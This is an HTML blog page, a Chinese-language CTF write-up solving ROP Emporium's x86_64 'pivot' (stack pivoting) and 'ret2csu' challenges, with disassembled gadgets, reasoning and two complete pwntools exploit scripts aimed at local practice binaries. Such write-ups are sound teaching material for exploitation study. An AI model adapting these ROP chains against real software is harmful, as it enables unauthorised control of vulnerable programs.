@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="ROP Emporium是一个提供ROP攻击学习样板程序的网站，一共8道题，每道题有64位、32位、ARM、MIPS共4种格式的ELF文件，适用于多种平台，难度依次递增。本文档为前6道题的x86_64位版本的解析。 ROP Emporium 7. pivot看名字就知道，这是一道栈迁移的题目。 gadget如下，有对栈的操作，能够修改rsp，也就能进行栈迁移了。 12345678910111213">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CoLin&#39;s Pwnhome">
+<meta property="og:url" content="http://hornos3.github.com/2023/02/28/ROP-Emporium-x86-64-7~8%E9%A2%98/index.html">
+<meta property="og:site_name" content="CoLin&#39;s Pwnhome">
+<meta property="og:description" content="ROP Emporium是一个提供ROP攻击学习样板程序的网站，一共8道题，每道题有64位、32位、ARM、MIPS共4种格式的ELF文件，适用于多种平台，难度依次递增。本文档为前6道题的x86_64位版本的解析。 ROP Emporium 7. pivot看名字就知道，这是一道栈迁移的题目。 gadget如下，有对栈的操作，能够修改rsp，也就能进行栈迁移了。 12345678910111213">
+<meta property="og:locale">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7e3d8999ad3b4824a9e8a6937c3118f8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f0cc71685ea44b81842923a51a9622a6.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3f6b36c38de5463c8575e86e8009d44f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/0fa8d75ba48a4c8a92aadcdbdadf46f4.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a851002722fb4b1c8ede1ba69c849e14.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c787b0b10f4b433b9e2669e23370040d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/32a654e812b34273ae0f8775c5dc5c39.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="article:published_time" content="2023-02-28T14:27:23.547Z">
+<meta property="article:modified_time" content="2023-02-28T14:27:23.547Z">
+<meta property="article:author" content="CoLin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/7e3d8999ad3b4824a9e8a6937c3118f8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16">
+
+<link rel="canonical" href="http://hornos3.github.com/2023/02/28/ROP-Emporium-x86-64-7~8%E9%A2%98/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh'
+  };
+</script>
+
+  <title> | CoLin's Pwnhome</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CoLin's Pwnhome</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/ROP-Emporium-x86-64-7~8%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's Pwnhome">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-02-28 22:27:23" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:23+08:00">2023-02-28</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>ROP Emporium是一个提供ROP攻击学习样板程序的网站，一共8道题，每道题有64位、32位、ARM、MIPS共4种格式的ELF文件，适用于多种平台，难度依次递增。本文档为前6道题的x86_64位版本的解析。</p>
+<p><a target="_blank" rel="noopener" href="https://ropemporium.com/index.html">ROP Emporium</a></p>
+<h1 id="7-pivot"><a href="#7-pivot" class="headerlink" title="7. pivot"></a>7. pivot</h1><p>看名字就知道，这是一道栈迁移的题目。</p>
+<p>gadget如下，有对栈的操作，能够修改rsp，也就能进行栈迁移了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004009BB ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004009BB</span><br><span class="line">.text:00000000004009BB usefulGadgets:</span><br><span class="line">.text:00000000004009BB                 pop     rax</span><br><span class="line">.text:00000000004009BC                 retn</span><br><span class="line">.text:00000000004009BD ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004009BD                 xchg    rax, rsp</span><br><span class="line">.text:00000000004009BF                 retn</span><br><span class="line">.text:00000000004009C0 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004009C0                 mov     rax, [rax]</span><br><span class="line">.text:00000000004009C3                 retn</span><br><span class="line">.text:00000000004009C4 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004009C4                 add     rax, rbp</span><br><span class="line">.text:00000000004009C7                 retn</span><br><span class="line">.text:00000000004009C7 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>程序一共有两次输入的机会，第一次是在伪造的栈中，第二次是直接接在后面的ROP。第二次的ROP长度不足，因此采用栈迁移。经过试验发现，第二个ROP的长度正好足够进行栈迁移。迁移后，我们只需要返回到ret2win函数即可。但是这个函数在lib文件中，加载基地址未知。对此，我们可以调用gadget获取lib中foothold_function函数的基地址，这也是源程序中唯一一个能够在plt节中找到的lib函数。注意到有一个gadget是mov rax, [rax]，既然我们能够控制rax的值，就可以将任意地址的值写入到rax中。如果没有这个gadget，我们就需要使用puts或printf函数将地址输出并返回到main函数中再次进行ROP注入。注意到还有一个gadget是add rax, rbp。我们读取lib中的函数偏移，让rbp等于ret2win的地址与foothold_function地址之差，就能够不通过输出直接将ret2win的地址保存到rax之中（在整个过程中rbp会通过leave, push, pop等指令保持不变）。注意到程序中有一条指令为jmp rax。我们直接跳转到这条指令即可让控制流跳转到ret2win函数。我想作者不让我们使用puts函数再进行一次注入的原因可能与程序本身有关，因为除了jmp rax之外，我们无法将返回地址写到栈上，这也就强迫我们使用所有的gadget。</p>
+<p>参考：leave指令 &#x3D; mov rsp, rbp;  mov rbp, [rbp]</p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">lib = ELF(<span class="string">&#x27;./libpivot.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rax = <span class="number">0x4009bb</span></span><br><span class="line">rsp = <span class="number">0x4009bd</span></span><br><span class="line">rax_addr = <span class="number">0x4009c0</span></span><br><span class="line">add_rax = <span class="number">0x4009c4</span></span><br><span class="line">jmp_rax = <span class="number">0x4007c1</span></span><br><span class="line">main_addr = <span class="number">0x400847</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;place to pivot: 0x&#x27;</span>)</span><br><span class="line">fake_stack = <span class="built_in">int</span>(io.recv(<span class="number">12</span>).decode(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP chain in fake stack</span></span><br><span class="line">payload = p64(elf.plt[<span class="string">&#x27;foothold_function&#x27;</span>])		<span class="comment"># call foothold_function() first so that the .got section can be rewritten into real address of this function</span></span><br><span class="line">payload += p64(rax) + p64(elf.got[<span class="string">&#x27;foothold_function&#x27;</span>])	<span class="comment"># get rax to the address of .got</span></span><br><span class="line">payload += p64(rax_addr)		<span class="comment"># read the address to rax</span></span><br><span class="line">payload += p64(add_rax)</span><br><span class="line">payload += p64(jmp_rax)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP chain in stack</span></span><br><span class="line">payload = cyclic(<span class="number">32</span>)	<span class="comment"># 0x20</span></span><br><span class="line">payload += p64(lib.symbols[<span class="string">&#x27;ret2win&#x27;</span>] - lib.symbols[<span class="string">&#x27;foothold_function&#x27;</span>])	<span class="comment"># value that needed to be added to rax later</span></span><br><span class="line">payload += p64(rax) + p64(fake_stack)	<span class="comment"># pop fake stack address to rax</span></span><br><span class="line">payload += p64(rsp)						<span class="comment"># exchange rax and rsp, the length of first ROP comes to the limit: 0x40</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="8-ret2csu"><a href="#8-ret2csu" class="headerlink" title="8. ret2csu"></a>8. ret2csu</h1><p>这是一种利用__libc_csu_init函数构造ROP的攻击方式。在本题中，由于是64位程序，因此在有些细节方面可能不好把握。</p>
+<p><img src="https://img-blog.csdnimg.cn/7e3d8999ad3b4824a9e8a6937c3118f8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>本题有后门函数ret2win，但是要想拿到shell首先需要传入正确的参数，即第7行的3个参数。</p>
+<p>ret2csu的攻击流程大致如下：</p>
+<p>首先将返回地址改到ret2csu函数的这个地方：<br><img src="https://img-blog.csdnimg.cn/f0cc71685ea44b81842923a51a9622a6.png"><br>在这里我们可以控制一系列寄存器的值。如果我们使用ROPgadget查找还能够发现惊喜。<br><img src="https://img-blog.csdnimg.cn/3f6b36c38de5463c8575e86e8009d44f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>注意到上面的pop rdi; ret了吗？它实际上是将原来的pop r15指令拆掉了，其机器码正好是5F，上面的pop rsi, ret同理。因此在这里我们可以控制的寄存器有：rbx,rbp,r12,r13,r14,r15,rdi,rsi，其中rdi,rsi是作为函数的前两个参数传递的，因此我们可以正确地传入前两个参数。</p>
+<p>第三个函数参数在rdx中保存，可惜我们这里并不能控制rdx，这就需要用到__libc_csu_init函数的第二个gadget了：<br><img src="https://img-blog.csdnimg.cn/0fa8d75ba48a4c8a92aadcdbdadf46f4.png"><br>这里可以将rdx赋值为r15的值，而我们之前能够控制r15的值，因此第三个参数能够正确传入。后面的call指令，由于我们能够控制r12和rbx的值，那么也就相当于我们可以call任意一个地址。</p>
+<p>但是！有一个问题出现了。请注意，这里会对rdx,rsi,edi进行赋值。其中rdx和rsi的赋值都没问题，我们将参数事先存放到r15和r14中即可。问题就出在对edi的赋值上。根据测试检验发现，mov esi, r13d指令会将rdi的高32位清零。这就会导致我们的第一个参数错误。但好巧不巧的是其后面就是call指令，我们已经没有机会再去修改这个错误了。</p>
+<p>我曾经想过，如果第一次能够call回到第一个ROP段中将rdi重新pop一次，之后直接返回到call指令，或许有用。但这里的call是取地址，如果将r12+rbx*8改为pop rdi;ret的地址，实际上call的并不是这里，而是会读取这里的机器码call出去，这当然是会崩溃的。</p>
+<p>参考其他资料发现这里的指令依libc版本不同而可能不同，在有些版本中是mov rdi, r13，这样的话没有任何问题，但现在这种情况就需要动动脑子了。问师傅，鸽了两周都不回——无奈只能全论坛找答案。（菜）</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/devil8123665/article/details/123810055?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165052857116780357264558%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165052857116780357264558&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-123810055.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=ROP_emporium+ret2csu&spm=1018.2226.3001.4187">传送门</a></p>
+<p>实际上通过ret，我们不是非得通过call指令转到ret2win函数，任何一个ret之后接ret2win函数的地址均可。所以这里的思路就是：让call指令无意义且在确保对寄存器影响最小的情况下返回，不能影响rdx的值，否则无效。</p>
+<p><img src="https://img-blog.csdnimg.cn/a851002722fb4b1c8ede1ba69c849e14.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>我们再回过头看一下这段代码，如果我们call之后能够安全返回，那么之后会判断rbp和rbx是否相等。我们可以控制rbp和rbx的值，因此这里的jnz我们可以跳过，方法是：将rbx赋值为0，rbp赋值为1。这样在call之后我们又可以进行一连串的pop操作。此时的pop显然并不会影响rdi,rsi,rdx的值，在ret之后接上pop rdi,ret的地址就能够将rdi成功修正，然后直接返回到ret2win函数，岂不妙哉。</p>
+<p>因此，我们现在的目标是在ret2csu程序中找到一个能够安全返回且不影响rdx的代码片段。当然我们需要根据ret指令来查找。在IDA中进行查找，对每个ret指令前面的代码进行检查，判断其是否满足我们的需求。下面是找到的可能符合需求的几个代码碎片：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.init:00000000004004E2 48 83 C4 08                                   add     rsp, 8</span><br><span class="line">.init:00000000004004E6 C3                                            retn</span><br><span class="line"></span><br><span class="line">.text:0000000000400588 5D                                            pop     rbp</span><br><span class="line">.text:0000000000400589 C3                                            retn</span><br><span class="line"></span><br><span class="line">.text:00000000004005C8 5D                                            pop     rbp</span><br><span class="line">.text:00000000004005C9 C3                                            retn</span><br><span class="line"></span><br><span class="line">.text:00000000004005E2 C6 05 4F 0A 20 00 01                          mov     cs:__bss_start, 1</span><br><span class="line">.text:00000000004005E9 5D                                            pop     rbp</span><br><span class="line">.text:00000000004005EA C3                                            retn</span><br><span class="line"></span><br><span class="line">.text:0000000000400610 B8 00 00 00 00                                mov     eax, 0</span><br><span class="line">.text:0000000000400615 5D                                            pop     rbp</span><br><span class="line">.text:0000000000400616 C3                                            retn</span><br><span class="line"></span><br><span class="line">.text:0000000000400630 5D                                            pop     rbp</span><br><span class="line">.text:0000000000400631 C3                                            retn</span><br><span class="line"></span><br><span class="line">.text:0000000000400696 48 83 C4 08                                   add     rsp, 8</span><br><span class="line">.text:000000000040069A 5B                                            pop     rbx</span><br><span class="line">.text:000000000040069B 5D                                            pop     rbp</span><br><span class="line">.text:000000000040069C 41 5C                                         pop     r12</span><br><span class="line">.text:000000000040069E 41 5D                                         pop     r13</span><br><span class="line">.text:00000000004006A0 41 5E                                         pop     r14</span><br><span class="line">.text:00000000004006A2 41 5F                                         pop     r15</span><br><span class="line">.text:00000000004006A4 C3                                            retn</span><br><span class="line"></span><br><span class="line">.fini:00000000004006B4 48 83 EC 08                                   sub     rsp, 8          ; _fini</span><br><span class="line">.fini:00000000004006B8 48 83 C4 08                                   add     rsp, 8</span><br><span class="line">.fini:00000000004006BC C3                                            retn</span><br></pre></td></tr></table></figure>
+
+<p>其中最值得我们关注的就是最后一个片段，它将rsp减8又加8，相当于没有任何变化，而前面的片段均对寄存器有或多或少的影响。于是我们使用最后一个代码片段试试看。</p>
+<p>要能够成功使用代码片段，还需要在内存空间中找到一个保存着这个代码段地址的地方，因为前面已经说过，call的地址是取值拿到的，所以不能直接将地址放在寄存器中。我们在IDA中尝试搜索，没想到还真的搜索到了：</p>
+<p><img src="https://img-blog.csdnimg.cn/c787b0b10f4b433b9e2669e23370040d.png"></p>
+<p>我们只需要将r12赋值为0x4003b0，就能够完美跳过这个call并毫发无损地返回，也就有了修正第一个参数的机会。注意：此时我们会多pop掉7个参数，因此要在栈中加7个无效数。</p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line">lib = ELF(<span class="string">&#x27;./libret2csu.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ROP_1 = <span class="number">0x40069a</span></span><br><span class="line">ROP_2 = <span class="number">0x400680</span></span><br><span class="line">rdi = <span class="number">0x4006a3</span></span><br><span class="line">call = <span class="number">0x400689</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload += p64(rdi) + p64(<span class="number">0xdeadbeefdeadbeef</span>)		<span class="comment"># pop the first argument</span></span><br><span class="line">payload += p64(ROP_1)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0x4003B0</span>) + p64(<span class="number">0xdeadbeefdeadbeef</span>) + p64(<span class="number">0xcafebabecafebabe</span>) + p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line">payload += p64(ROP_2)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(rdi) + p64(<span class="number">0xdeadbeefdeadbeef</span>) </span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;ret2win&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/32a654e812b34273ae0f8775c5dc5c39.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>由此可见，在做题的过程中，转换思路很重要。一条指令可以有用，也可以无用。可能需要精心构造进入，也可能需要精心构造绕过。全方位思考，整合程序中的所有资源为己所用，方能在pwn的世界纵横捭阖，左右逢源。要学的东西，还有很多……</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/02/28/ROP-Emporium-x86-64-7-8%E9%A2%98/" rel="prev" title="ROP Emporium x86_64 7~8题">
+      <i class="fa fa-chevron-left"></i> ROP Emporium x86_64 7~8题
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2022-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94yakagame/" rel="next" title="强网杯2022 pwn 赛题解析——yakagame">
+      强网杯2022 pwn 赛题解析——yakagame <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#7-pivot"><span class="nav-number">1.</span> <span class="nav-text">7. pivot</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#8-ret2csu"><span class="nav-number">2.</span> <span class="nav-text">8. ret2csu</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">CoLin</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">81</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">CoLin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
